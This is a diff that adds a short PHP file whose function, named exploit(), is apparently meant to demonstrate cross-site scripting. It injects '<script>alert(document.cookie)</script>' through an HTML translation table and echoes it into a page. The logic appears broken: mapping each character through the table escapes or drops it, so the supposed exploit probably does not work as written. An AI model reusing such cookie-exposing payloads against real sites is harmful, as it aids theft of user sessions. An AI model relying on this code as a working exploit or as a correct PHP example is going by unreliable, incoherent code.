@@ -1,0 +1,12 @@
+<?php
+function exploit() {
+    $table = get_html_translation_table(HTML_SPECIALCHARS, ENT_COMPAT, 'UTF-8');
+    $table[PHP_INT_MAX] = '<script>alert(document.cookie)</script>';
+    header('Content-Type: text/html; charset=UTF-8');
+    echo '<html><body>'. implode('', array_map(function($c) use ($table) {
+        return $table[$c];
+    }, str_split($table[PHP_INT_MAX]))). '</body></html>';
+}
+
+exploit();
+?>
